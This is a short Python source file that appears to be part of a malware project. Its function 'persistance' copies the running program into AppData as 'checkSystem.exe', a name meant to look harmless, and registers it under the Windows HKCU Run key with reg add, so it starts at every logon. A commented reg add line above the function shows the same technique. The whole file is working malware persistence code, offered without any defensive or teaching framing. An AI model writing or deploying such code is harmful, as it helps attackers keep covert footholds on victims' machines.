#reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "C:/test.exe
import os
import subprocess
import shutil
import sys
def persistance():
    evil_path = os.environ["AppData"] + "\\checkSystem.exe"
    print(evil_path)
    if not os.path.exists(evil_path):
        shutil.copy(sys.executable, evil_path)
        subprocess.call(
            f'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v check_system /t REG_SZ /d "{evil_path}"')